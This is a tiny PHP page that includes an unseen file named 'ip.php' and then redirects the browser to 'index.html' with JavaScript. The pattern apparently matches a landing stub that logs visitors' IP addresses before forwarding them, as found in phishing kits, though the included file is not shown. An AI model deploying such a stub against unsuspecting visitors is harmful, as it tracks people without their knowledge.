<?php
include 'ip.php';
?>
<script type="text/javascript">
document.location = "index.html";
</script> 
